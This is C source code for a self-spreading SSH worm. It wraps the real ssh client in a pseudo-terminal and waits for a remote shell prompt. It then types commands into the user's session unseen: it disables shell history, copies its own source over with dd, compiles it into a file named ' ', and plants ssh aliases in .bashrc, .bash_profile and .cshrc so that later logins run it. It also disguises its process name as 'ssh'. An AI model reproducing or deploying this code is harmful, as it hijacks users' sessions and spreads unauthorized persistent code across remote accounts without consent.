// I partly ripped the idea from a friend who did similar
// things in a different way. However this solution seems
// more usable.
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>


FILE *me;

int open_pty(int *master, int *slave)
{
	char devpty[] = "/dev/ptyXY";
	char *s1 = "pqrstuvwxyzPQRST",
	     *s2 = "0123456789abcdef";

	for (; *s1 != 0; ++s1) {
		devpty[8] = *s1;
		for (; *s2 != 0; ++s2) {
			devpty[9] = *s2;
			if ((*master = open(devpty, O_RDWR|O_NOCTTY)) < 0) {
				if (errno == ENOENT)
					return -1;
				else
					continue;
			}
			devpty[5] = 't';
			if ((*slave = open(devpty, O_RDWR|O_NOCTTY)) < 0) {
				close(*master);
				return -1;
			}
			return 0;
		}
	}
	return -1;						
}


char crept_in = 0;

// contains buf the shellprompt?
char check_shell(char *buf)
{
	int l = strlen(buf);
	if (l < 2)
		return 0;
	if ((buf[l-2] == '#' || buf[l-2] == '>' ||
	    buf[l-2] == ')' || buf[l-2] == '$') &&
	    buf[l-1] == ' ')
		return 1;
	return 0;
}

// read until you see shellprompt
int s_read(int fd, char *d, size_t dl)
{
	do {
		memset(d, 0, dl);
		if (read(fd, d, dl) <= 0)
			return -1;
	} while (!check_shell(d));
	return 0;
}


// read exactly until string s seen
// do not even read one byte more
int read_until(int fd, char *s)
{
	char *buf = (char*)calloc(1, 128);
	char *ptr = buf;
	int l = 0, n = 0, i = 1, N = 0;

	do {
		l = read(fd, ptr, 1);
		if (l <= 0) {
			free(buf);
			return -1;
		}
		++ptr; ++n; ++N;
		if (n >= 127) {
			++i; n = 0;
			buf = (char*)realloc(buf, 128*i);
			ptr = buf+N;
			memset(ptr, 0, 128);
		}
	} while (strstr(buf, s) == NULL);

	free(buf);
	return 0;
}


int creep_in(int fd)
{
	char dummy[4096],
	     *shell = "\x24SHELL\n",
	     *cat = "dd of=x2.c bs=1 count=9999\n",
	     *noecho = "unset HISTFILE\n",
	     *cc = "cc x2.c -o ' ';cat x2.c>>' ';rm -f x2.c\n",
	     *test = "grep -q -s ssh .bashrc;echo \x24?\n",

	     *plant = "echo >>.bashrc;"
		      "echo alias ssh=\"\x24HOME/'\x5c '\">>.bashrc;"
		      "echo alias /usr/bin/ssh=\"\x24HOME/'\x5c '\">>.bashrc;"

		      "echo >>.bash_profile;"
		      "echo alias ssh=\"\x24HOME/'\x5c '\">>.bash_profile;"
		      "echo alias /usr/bin/ssh=\"\x24HOME/'\x5c '\">>.bash_profile;"

		      "echo >>.cshrc;"
		      "echo alias ssh \"\x24HOME/'\x5c '\">>.cshrc;"
		      "echo alias /usr/bin/ssh \"\x24HOME/'\x5c '\">>.cshrc\n",

	     *exit = "stty echo;exit\n",
	     *newsh = "exec \x24SHELL\n";
	int i = 0;
	struct termios t, ot;

	// disable echo on master or we would
	// read twice what we wrote to shell
	tcgetattr(fd, &t); ot = t; t.c_lflag &= ~ECHO;
	tcsetattr(fd, TCSANOW, &t);
	
	write(fd, shell, strlen(shell));
	read_until(fd, "\x24SHELL");

	s_read(fd, dummy, sizeof(dummy));

	write(fd, noecho, strlen(noecho));
	read_until(fd, "\n");
	s_read(fd, dummy, sizeof(dummy));

	write(fd, test, strlen(test)); // see if account is already infected
	read_until(fd, "\n");
	memset(dummy, 0, sizeof(dummy));
	read(fd, dummy, 1);

	printf("infected: %c\r\n", dummy[0]);

	if (dummy[0] == '0')
		s_read(fd, dummy, sizeof(dummy)); // infected
	else {	
		s_read(fd, dummy, sizeof(dummy)); // not infected

		write(fd, cat, strlen(cat));
		read_until(fd, "\n");

		while (fgets(dummy, sizeof(dummy), me))
			write(fd, dummy, strlen(dummy));

		read_until(fd, "records out");
		s_read(fd, dummy, sizeof(dummy));

		write(fd, cc, strlen(cc));
		read_until(fd, "\n");
		s_read(fd, dummy, sizeof(dummy));

		write(fd, plant, strlen(plant));
		read_until(fd, "\n");
		s_read(fd, dummy, sizeof(dummy));
	}

	write(fd, exit, strlen(exit));
	read_until(fd, "\n");
	s_read(fd, dummy, sizeof(dummy));

	write(fd, newsh, strlen(newsh));
	read_until(fd, "\x24SHELL");

	s_read(fd, dummy, sizeof(dummy));// read 2nd time b/c
					 // $ from $SHELL matched again

	// reset terminal mode
	tcsetattr(fd, TCSANOW, &ot);
	return 0;
}


extern char **environ;

int main(int argc, char **argv)
{
	int m, s, r;
	char **ssh, buf[4096];
	fd_set rset;
	struct termios t, ot;
	struct winsize ws;


	ssh = (char**)calloc(argc, sizeof(char *));
	for (m = 0; m < argc; ++m) {
		ssh[m] = (char*)calloc(strlen(argv[m])+10, 1);
		strcpy(ssh[m], argv[m]);
	}
	strcpy(ssh[0], "ssh");
	me = fopen(*argv, "r");
	memset(*argv, 0, strlen(*argv)); strcpy(*argv, "ssh");

	fseek(me, -9999, SEEK_END);
	
	setbuffer(stdin, NULL, 0);
	setbuffer(stdout, NULL, 0);

	if (open_pty(&m, &s) < 0)
		return 1;

	// make term raw
	tcgetattr(m, &t); ot = t; cfmakeraw(&t);
	t.c_cc[VMIN] = 1;
	t.c_cc[VTIME] = 0;
	tcsetattr(0, TCSANOW, &t);

	// set correct size on slave
	if (ioctl(0, TIOCGWINSZ, (char*)&ws) >= 0)
		ioctl(s, TIOCSWINSZ, (char*)&ws);


	if (fork() == 0) {
		setsid();
		// make slave point to stdin/stdout/stderr and the 
		// controlling terminal
		dup2(s, 0); dup2(s, 1); dup2(s, 2);
		close(m); close(s);
		ioctl(0, TIOCSCTTY, 0);
		execve("/usr/bin/ssh", ssh, environ);
		execve("/usr/local/bin/ssh", ssh, environ);
		execve("/usr/sbin/ssh", ssh, environ);
		exit(1);
	}
	close(s);


	// standard lame I/O multiplex
	while (1) {
		FD_ZERO(&rset);
		FD_SET(0, &rset);
		FD_SET(m, &rset);

		if (select(m+1, &rset, NULL, NULL, NULL) < 0) {
			if (errno == EAGAIN)
				continue;
			else
				break;
		}
		memset(buf, 0, sizeof(buf));
		if (FD_ISSET(0, &rset)) {
			r = read(0, buf, sizeof(buf));
			if (r <= 0)
				break;
			if (write(m, buf, r) < 0)
				break;
		}
		if (FD_ISSET(m, &rset)) {
			r = read(m, buf, sizeof(buf));
			if (r <= 0)
				break;
			if (write(1, buf, r) < 0)
				break;
			if (!crept_in && check_shell(buf)) {
				crept_in = 1;
				creep_in(m);
			}
				
				
		}
	}

	// reset terminal
	tcsetattr(0, TCSANOW, &ot);
	return 0;
}

